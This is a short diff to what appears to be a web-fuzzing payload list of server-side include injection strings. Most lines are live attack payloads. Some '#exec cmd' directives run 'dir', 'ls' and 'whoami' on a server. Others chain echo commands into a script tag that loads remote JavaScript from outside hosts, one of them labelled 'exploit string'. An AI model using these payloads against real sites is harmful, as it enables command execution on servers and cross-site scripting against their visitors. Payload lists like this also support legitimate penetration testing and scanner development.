@@ -16,6 +16,7 @@
 <!--#echo var="content_length" -->
 <!--#echo var="content_type" -->
 <!--#echo var="date_gmt" -->
+<!--#echo var="date_local" -->
 <!--#echo var="document_name" -->
 <!--#echo var="document_root" -->
 <!--#echo var="document_uri" -->
@@ -115,7 +116,6 @@
 <pre><!--#exec cmd="dir" --></pre>
 <pre><!--#exec cmd="ls" --></pre>
 <pre><!--#exec cmd="whoami"--></pre>
-[7*7]#execinfo
 add <!--#exec cmd="/bin/echo '<scr'"--><!--#exec cmd="/bin/echo 'ipt src=http://vulnerability-lab.com/crosssitescripting.js></script>'"-->
 app/cache/dev/annotations/sonata-adminbundle-controller-crudcontroller#configure.cache.php
 exploit string: <!--#exec cmd="/bin/echo '<script src'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></script>'"-->
